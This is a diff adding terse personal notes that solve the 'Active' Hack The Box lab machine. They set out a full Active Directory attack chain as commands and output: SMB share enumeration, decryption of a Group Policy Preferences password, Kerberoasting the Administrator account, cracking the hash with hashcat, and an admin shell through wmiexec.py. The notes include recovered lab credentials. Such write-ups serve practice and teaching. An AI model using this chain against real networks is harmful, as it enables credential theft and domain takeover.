@@ -1,0 +1,61 @@
+Active
+==================
+- nmap: LDAP - Ports (Domain Controller!)
+- /etc/hosts: 10.10.10.100 active.htb
+- enum4linux
+
+ Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        Replication     Disk
+        SYSVOL          Disk      Logon server share
+        Users           Disk
+
+//10.10.10.100/Replication Ok
+
+- smbclient //10.10.10.100/Replication
+  => RECURSE ON
+  => PROMPT OFF
+  => mget *
+- ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+     => name="active.htb\SVC_TGS"
+     => cpassword=edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+- gpp-decrypt cpassword
+     => GPPstillStandingStrong2k18
+- smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
+ 
+[+] IP: 10.10.10.100:445        Name: active.htb
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share
+        Replication                                             READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share
+        Users                                                   READ ONLY
+
+-  smbclient -U SVC_TGS //10.10.10.100/Users
+   => user.txt (Desktop von SVC_TGS)
+-  python GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Querying 10.10.10.100 for information about domain.
+Name                  Email                           PasswordLastSet      LastLogon
+--------------------  ------------------------------  -------------------  -------------------
+Administrator                                         2018-07-18 20:06:40.351723  2018-07-30 18:17:40.656520
+Guest                                                 <never>              <never>
+krbtgt                                                2018-07-18 19:50:36.972031  <never>
+SVC_TGS                                               2018-07-18 21:14:38.402764  2020-04-22 20:39:08.418405
+
+
+- Administrator Ticket Granting Service Hash:
+  GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100 -request > tmp
+- Hashcat rockyou.txt
+   => Ticketmaster1968
+- wmiexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
+   => root.txt 
